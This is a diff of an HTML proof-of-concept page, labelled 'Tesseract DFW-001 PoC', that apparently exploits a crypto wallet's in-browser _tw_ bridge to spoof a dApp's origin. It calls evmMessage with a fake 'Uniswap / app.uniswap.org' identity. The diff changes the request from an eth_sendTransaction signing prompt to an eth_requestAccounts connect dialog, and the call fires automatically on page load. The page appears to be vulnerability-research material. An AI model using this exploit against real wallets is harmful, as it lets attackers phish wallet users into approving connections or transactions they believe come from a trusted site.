@@ -1,25 +1,24 @@
 <!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
 <title>dfw-poc</title></head>
 <body style="font:15px monospace;padding:18px;background:#111;color:#0f0">
-<h3>Tesseract DFW-001 PoC — _tw_ signing-origin spoof</h3>
+<h3>Tesseract DFW-001 PoC — _tw_ connect-origin spoof</h3>
 <pre id=log>loading…</pre>
-<button id=go style="font-size:18px;padding:10px">fire evmMessage (spoof Uniswap)</button>
+<button id=go style="font-size:18px;padding:12px;margin-top:10px">fire eth_requestAccounts (spoof Uniswap)</button>
 <script>
 function L(m){var e=document.getElementById('log');e.innerText+=("\n"+m);}
 function fire(){
   try{
     var b=window._tw_;
-    L("origin="+location.href);
-    L("_tw_ type="+(typeof b));
-    if(!b){L("NO _tw_ bridge");return;}
-    var methods=[]; for(var k in b){methods.push(k);} L("methods="+methods.join(","));
-    var tx={method:"eth_sendTransaction",params:[{from:"0x0000000000000000000000000000000000000000",to:"0x000000000000000000000000000000000000dEaD",value:"0x0",data:"0x"}]};
-    // documented arg order: evmMessage(pageTitle, host, jsonRpc, chainId)
-    L("calling _tw_.evmMessage('Uniswap','app.uniswap.org', <eth_sendTransaction>, '0x1')");
-    var r = b.evmMessage ? b.evmMessage("Uniswap","app.uniswap.org",JSON.stringify(tx),"0x1") : "(no evmMessage)";
-    L("evmMessage returned: "+r);
+    L("real_origin="+location.host);
+    if(!b){L("NO _tw_");return;}
+    var ms=[];for(var k in b){ms.push(k);}L("methods="+ms.join(","));
+    // eth_requestAccounts = connect (NOT connection-gated) -> pops connect dialog with attacker-supplied identity
+    var req={method:"eth_requestAccounts",params:[]};
+    L("calling _tw_.evmMessage('Uniswap','app.uniswap.org', eth_requestAccounts, '0x1')");
+    var r=b.evmMessage("Uniswap","app.uniswap.org",JSON.stringify(req),"0x1");
+    L("returned: "+r+"  -> expect a CONNECT dialog showing 'Uniswap / app.uniswap.org' (spoofed; real="+location.host+")");
   }catch(e){L("ERR "+e);}
 }
 document.getElementById('go').onclick=fire;
-window.onload=function(){L("page rendered. real origin = "+location.host+" (NOT app.uniswap.org)"); setTimeout(fire,800);};
+window.onload=function(){L("rendered.");setTimeout(fire,900);};
 </script></body></html>
